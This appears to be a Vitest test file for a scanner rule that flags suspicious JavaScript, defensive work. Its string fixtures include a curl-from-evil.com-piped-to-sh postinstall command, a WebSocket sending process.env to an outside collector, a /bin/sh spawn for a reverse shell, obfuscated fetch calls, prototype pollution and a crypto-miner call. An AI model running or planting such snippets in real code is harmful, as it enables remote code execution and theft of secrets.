import { describe, it, expect } from 'vitest';
import { suspiciousPattern } from '../../rules/suspicious-pattern.js';

describe('suspiciousPattern rule', () => {
  it('passes clean code', () => {
    const result = suspiciousPattern('const x = 1;\nconsole.log(x);');
    expect(result.pass).toBe(true);
    expect(result.severity).toBe('info');
  });

  it('passes empty code', () => {
    const result = suspiciousPattern('');
    expect(result.pass).toBe(true);
  });

  it('detects base64 decode + network call combo', () => {
    const code = 'const url = atob("aHR0cHM6Ly9ldmlsLmNvbQ==");\nfetch(url);';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
    expect(result.details).toContain('base64');
  });

  it('detects Buffer.from + fetch combo', () => {
    const code = 'const url = Buffer.from("data", "base64").toString();\nfetch(url);';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
  });

  it('detects crypto mining patterns', () => {
    const code = 'const miner = new CoinHive.Anonymous("site-key");';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
    expect(result.severity).toBe('fail');
    expect(result.details).toContain('crypto');
  });

  it('detects WebSocket to unknown endpoint with data collection', () => {
    const code = 'const ws = new WebSocket("wss://collector.xyz");\nws.send(JSON.stringify(process.env));';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
  });

  it('detects reverse shell patterns', () => {
    const code = 'const net = require("net");\nconst cp = require("child_process");\nconst sh = cp.spawn("/bin/sh", ["-i"]);';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
    expect(result.severity).toBe('fail');
    expect(result.details).toContain('reverse shell');
  });

  it('detects dynamic require of child_process', () => {
    const code = 'const mod = "child_" + "process";\nconst cp = require(mod);';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
  });

  it('detects prototype pollution attempts', () => {
    const code = 'obj.__proto__.isAdmin = true;';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
    expect(result.details).toContain('prototype');
  });

  it('detects constructor.constructor pattern', () => {
    const code = 'const fn = this.constructor.constructor("return process")();';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
  });

  it('detects postinstall script abuse pattern', () => {
    const code = 'const { execSync } = require("child_process");\nexecSync("curl https://evil.com/payload | sh");';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
    expect(result.severity).toBe('fail');
  });

  it('does not flag normal crypto usage', () => {
    const code = 'const hash = crypto.createHash("sha256").update(data).digest("hex");';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(true);
  });

  it('detects multiple suspicious patterns', () => {
    const code = 'obj.__proto__.x = 1;\nconst s = atob("aGk=");\nfetch(s);';
    const result = suspiciousPattern(code);
    expect(result.pass).toBe(false);
    const patterns = result.details.split(',').length;
    expect(patterns).toBeGreaterThanOrEqual(2);
  });
});
